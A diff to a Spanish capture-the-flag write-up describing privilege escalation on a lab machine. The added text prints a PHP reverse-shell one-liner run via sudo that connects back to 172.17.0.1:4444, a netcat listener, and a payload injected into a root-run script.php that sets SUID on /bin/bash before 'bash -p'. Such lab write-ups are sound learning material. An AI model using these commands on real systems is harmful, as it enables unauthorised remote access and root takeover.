@@ -187,10 +187,49 @@ Si hacesmo un whoami podemos ver que estamos con el usuario chocolate.
 
 ![image](https://github.com/user-attachments/assets/f24c07d0-8694-4c64-b01d-caf7347f6b6b)
 
-Vamos a generar una shell interactiva
+En mi caso he tenido problemas al ejecutar una shell, por lo que hice otra reverse shell y volvi a crear una TTY.
+
 ```bash
-script /dev/null -c bash
+sudo -u chocolate /usr/bin/php -r '$sock=fsockopen("172.17.0.1", 4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
+![image](https://github.com/user-attachments/assets/d6da8e77-bd3c-4908-b52a-b2cad03fcbd8)
+
+Por el otor lado estamos escuchando.
+```bash
+nc -lvnp 4444
+```
+![image](https://github.com/user-attachments/assets/8d272dbe-51ec-4f56-899b-eaf2a3744165)
+
+Y volvemos a hacer los pasos para una shell interactiva.
+
 # Accedor Root
 
-Vamos con el final despues de mirar 
+Vamos con el final despues de mirar sudo -l y tambien si teniamos permisos en algun binario SUID, no encontrasmo nada por lo que nos pusimos a mirar dentro de los procesos del sistema y vimos que root ejecutaba un `script.php`.
+
+![image](https://github.com/user-attachments/assets/d02290f2-e767-4831-89a0-83cfa22a183f)
+
+Vemos que tenemos permisos para modificar el archivo por lo que insertaremos dentro una shell para ser root.
+
+![image](https://github.com/user-attachments/assets/283e2201-7c80-4f78-a1ec-ea80de878f97)
+
+Como podemos cambiarlo a nuestro antojo vamos a poner lo siguiente.
+
+```php
+<?php
+exec("chmod u+s /bin/bash");
+?>
+```
+![image](https://github.com/user-attachments/assets/4f0b10d2-6146-4835-a4eb-4959835d69cb)
+
+Y cambiando los eso con poniendo solo falta general una shell.
+
+```bash
+bash -p
+```
+
+Ya seriamos root 
+
+![image](https://github.com/user-attachments/assets/d518ea73-baa7-491c-bba1-b25029b181cf)
+
+
+
